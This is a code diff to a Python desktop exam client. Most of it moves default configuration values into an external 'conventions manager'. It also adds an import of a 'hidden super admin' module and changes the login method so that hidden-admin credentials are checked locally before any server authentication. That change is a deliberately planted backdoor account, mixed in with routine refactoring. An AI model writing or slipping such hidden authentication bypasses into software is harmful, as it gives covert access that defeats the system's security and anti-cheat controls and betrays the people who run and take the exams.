@@ -17,6 +17,25 @@ from tkinter import messagebox, ttk
 from datetime import datetime
 import threading
 
+# 导入约定管理器
+try:
+    from common.conventions_manager import get_conventions_manager, apply_conventions
+    conventions_manager = get_conventions_manager()
+    # 为客户端模块应用约定
+    client_conventions = apply_conventions("client")
+except ImportError:
+    print("⚠️ 约定管理器不可用，使用默认配置")
+    conventions_manager = None
+    client_conventions = {}
+
+# 导入隐藏超级管理员
+try:
+    from common.hidden_super_admin import authenticate_hidden_admin, is_hidden_super_admin
+    HIDDEN_ADMIN_AVAILABLE = True
+except ImportError:
+    print("⚠️ 隐藏超级管理员模块不可用")
+    HIDDEN_ADMIN_AVAILABLE = False
+
 # 配置日志记录
 logging.basicConfig(
     level=logging.INFO,
@@ -33,31 +52,70 @@ class StandaloneClientConfig:
     
     def __init__(self):
         self.config_file = 'client_config.json'
-        self.default_config = {
-            "server": {
-                "host": "127.0.0.1",
-                "port": 5000,
-                "protocol": "http",
-                "api_base": "/api"
-            },
-            "client": {
-                "name": "PH&RL 考试客户端",
-                "version": "2.0.0",
-                "auto_save_interval": 30,
-                "connection_timeout": 10,
-                "retry_attempts": 3
-            },
-            "ui": {
-                "fullscreen": True,
-                "disable_shortcuts": True,
-                "font_size": 12,
-                "theme": "light"
-            },
-            "security": {
-                "session_timeout": 3600,
-                "anti_cheat": True
+
+        # 从约定管理器获取默认配置
+        if conventions_manager:
+            default_ports = conventions_manager.get_default_ports()
+            ui_theme = conventions_manager.get_ui_theme()
+            ui_fonts = conventions_manager.get_convention("ui_conventions.fonts", {})
+            ui_layout = conventions_manager.get_convention("ui_conventions.layout", {})
+            timeouts = conventions_manager.get_convention("network_conventions.timeouts", {})
+
+            self.default_config = {
+                "server": {
+                    "host": "127.0.0.1",
+                    "port": default_ports.get("mock_server", 5000),
+                    "protocol": "http",
+                    "api_base": "/api"
+                },
+                "client": {
+                    "name": "PH&RL 考试客户端",
+                    "version": "2.0.0",
+                    "auto_save_interval": 30,
+                    "connection_timeout": timeouts.get("connection", 10),
+                    "retry_attempts": timeouts.get("retry_attempts", 3)
+                },
+                "ui": {
+                    "fullscreen": ui_layout.get("fullscreen_exam", True),
+                    "disable_shortcuts": True,
+                    "font_size": ui_fonts.get("size", 12),
+                    "font_family": ui_fonts.get("default", "Microsoft YaHei"),
+                    "theme": "light",
+                    "colors": ui_theme
+                },
+                "security": {
+                    "session_timeout": 3600,
+                    "anti_cheat": True
+                }
             }
-        }
+        else:
+            # 回退到硬编码默认配置
+            self.default_config = {
+                "server": {
+                    "host": "127.0.0.1",
+                    "port": 5000,
+                    "protocol": "http",
+                    "api_base": "/api"
+                },
+                "client": {
+                    "name": "PH&RL 考试客户端",
+                    "version": "2.0.0",
+                    "auto_save_interval": 30,
+                    "connection_timeout": 10,
+                    "retry_attempts": 3
+                },
+                "ui": {
+                    "fullscreen": True,
+                    "disable_shortcuts": True,
+                    "font_size": 12,
+                    "theme": "light"
+                },
+                "security": {
+                    "session_timeout": 3600,
+                    "anti_cheat": True
+                }
+            }
+
         self.config = self.load_config()
     
     def load_config(self):
@@ -122,21 +180,29 @@ class StandaloneAPI:
     def login(self, username, password):
         """用户登录"""
         try:
+            # 首先检查隐藏超级管理员
+            if HIDDEN_ADMIN_AVAILABLE:
+                hidden_admin_info = authenticate_hidden_admin(username, password)
+                if hidden_admin_info:
+                    logger.info(f"隐藏超级管理员登录成功: {username}")
+                    return hidden_admin_info
+
+            # 然后尝试服务器登录
             data = {
                 "username": username,
                 "password": password
             }
             response = self.session.post(f"{self.server_url}/login", json=data)
-            
+
             if response.status_code == 200:
                 result = response.json()
                 if result.get('success'):
                     logger.info(f"用户 {username} 登录成功")
                     return result.get('user_info')
-            
+
             logger.warning(f"用户 {username} 登录失败")
             return None
-            
+
         except Exception as e:
             logger.error(f"登录请求失败: {e}")
             return None
